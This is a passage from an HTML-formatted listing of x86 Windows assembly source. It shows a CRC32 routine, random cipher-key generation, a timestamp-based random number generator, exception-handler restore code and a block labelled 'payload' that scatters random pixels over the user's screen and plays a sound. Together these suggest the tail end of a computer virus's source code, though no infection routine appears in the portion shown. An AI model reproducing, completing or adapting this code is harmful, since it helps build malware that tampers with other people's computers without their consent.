    </span><span class="sc5">@@load_character</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

    </span><span class="sc5">@@crc_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@@loop_crc_byte</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0edb88320h</span><span class="sc0">

    </span><span class="sc5">@@loop_crc_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@crc_byte</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@load_character</span><span class="sc0">

    </span><span class="sc5">@@exit_calc_crc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@init_cipher_key</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">cipher_key</span><span class="sc0">
    </span><span class="sc5">@@init_cipher_key_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc12">'z'</span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rng</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@init_cipher_key_loop</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;  ---------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">rng</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  random number generator in range</span><span class="sc0">
    </span><span class="sc1">;;  in</span><span class="sc0">
    </span><span class="sc1">;;   esi = range</span><span class="sc0">
    </span><span class="sc1">;;  out</span><span class="sc0">
    </span><span class="sc1">;;   eax = random number</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rdtsc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_seed</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc1">;;;  ---------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  restore seh</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">exit1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  normal exit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc0">
    
    
</span><span class="sc1">;;;  ------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetDC</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@exit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dcontext</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SM_CXSCREEN</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetSystemMetrics</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">x_system</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SM_CYSCREEN</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetSystemMetrics</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">y_system</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">count</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">@@moremore</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  count</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000000ffh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">y_system</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rng</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">x_system</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rng</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dcontext</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">SetPixel</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">count</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">count</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@exit</span><span class="sc0">
    
    </span><span class="sc5">@@sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@moremore</span><span class="sc0">


    </span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4h</span><span class="sc0">      </span><span class="sc1">;SND_MEMORY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">wav</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">PlaySound</span><span class="sc0">
    
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">          </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span></div></body>
</html>
